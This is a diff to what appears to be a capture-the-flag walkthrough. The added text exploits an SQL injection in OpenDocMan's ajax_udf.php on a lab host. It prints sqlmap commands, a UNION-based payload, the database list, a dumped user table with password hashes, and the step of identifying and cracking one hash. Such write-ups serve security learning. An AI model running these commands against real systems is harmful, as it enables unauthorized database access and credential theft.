@@ -118,14 +118,52 @@ So we can assume that the system is blocking PHP files. So I started looking for
 
 https://www.exploit-db.com/exploits/32075/
 
-The exploit is related to a SQL Injection, so let's fire up sqlmap:
+Analyzing the exploit we can see that it is an SQL Injection and is related to a insufficient validation of "add_value" HTTP GET parameter in "/ajax_udf.php" script. A remote unauthenticated attacker can execute arbitrary SQL commands in application's database.
+ 
+Let's fire up sqlmap using the value in question and see what databases we can find:
 
 ```
-sqlmap -u 'http://192.168.0.100/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user'
--p add_value -D jabcd0cs --dump
+# sqlmap -u 'http://192.168.0.100/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user' --dbs
+
+... snip ...
+
+[22:56:29] [INFO] resuming back-end DBMS 'mysql' 
+[22:56:29] [INFO] testing connection to the target URL
+[22:56:29] [INFO] heuristics detected web page charset 'ISO-8859-2'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: add_value (GET)
+    Type: UNION query
+    Title: MySQL UNION query (86) - 9 columns
+    Payload: q=1&add_value=odm_user UNION ALL SELECT 86,CONCAT(0x71716a6a71,0x6677646748424473794d5952474d4977574c6a4447526b65667267776852736c6f556f7967795a52,0x71706b7171),86,86,86,86,86,86,86#
+---
+[22:56:29] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL 5
+[22:56:29] [INFO] fetching database names
+[22:56:29] [INFO] heuristics detected web page charset 'windows-1252'
+[22:56:29] [WARNING] reflective value(s) found and filtering out
+available databases [6]:
+[*] drupal7
+[*] information_schema
+[*] jabcd0cs
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+
 ```
 
-After some sqlmapping we managed to reach a password table called "odm_user" with some users and passwords: 
+After some sqlmap we can see that we are fetching information from a MySQL Database server, and we've found interesting tables here, including phpmyadmin, which may be used to administer the database. 
+
+Let's try to see the tables for the "jabcd0cs" database first:
+
+```
+# sqlmap -u 'http://192.168.0.100/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user' --dbs --tables
+```
+The output is huge so I won't be posting here, BUT, analyzing all the databases we've got, I found one called "odm_user" which appears to be the table responsible for the user's credentials.
+
+Here is the information inside this table:  
 
 ```
 Database: jabcd0cs
@@ -138,3 +176,19 @@ Table: odm_user
 | 2  | 555 5555555 | guest@example.com  | guest    | 084e0343a0486ff05530df6c705c8bb4 (guest) | guest     | guest      | 2          | NULL          |
 +----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
 ```
+
+Notice that one of the users is "webmin". Once we have the hash we can try to discover what kind of hash it is, by using hash-identifier: 
+
+```
+# hash-identifier
+
+... snip ...
+
+ HASH: b78aae356709f8c31118ea613980954b
+
+Possible Hashs:
+[+]  MD5
+[+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+```
+
+So let's do the cracking in an easy way, throwing the hash into google.
